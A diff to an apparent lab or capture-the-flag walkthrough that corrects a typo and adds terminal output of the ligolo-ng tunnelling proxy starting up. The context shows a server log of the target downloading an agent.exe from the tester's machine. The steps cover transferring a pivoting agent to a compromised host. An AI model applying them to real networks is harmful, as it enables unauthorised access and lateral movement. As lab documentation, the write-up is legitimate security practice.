@@ -554,5 +554,32 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.129.48.21 - - [20/Aug/2026 20:27:30] "GET /agent.exe HTTP/1.1" 200 -
 ```
 
-FIrst ill transfer the agent to the target
+First ill transfer the agent to the target
 
+```python
+sudo ./proxy -selfcert
+[sudo] password for kali: 
+INFO[0000] Loading configuration file ligolo-ng.yaml    
+WARN[0000] daemon configuration file not found. Creating a new one... 
+? Enable Ligolo-ng WebUI? No
+WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
+ERRO[0000] Certificate cache error: acme/autocert: certificate cache miss, returning a new certificate 
+INFO[0000] Listening on 0.0.0.0:11601                   
+    __    _             __                       
+   / /   (_)___ _____  / /___        ____  ____ _
+  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
+ / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
+/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
+        /____/                          /____/   
+
+  Made in France ♥            by @Nicocha30!
+  Version: 0.9.1
+
+ligolo-ng »
+```
+
+Ill start the proxy  on my machine
+
+```python
+
+```
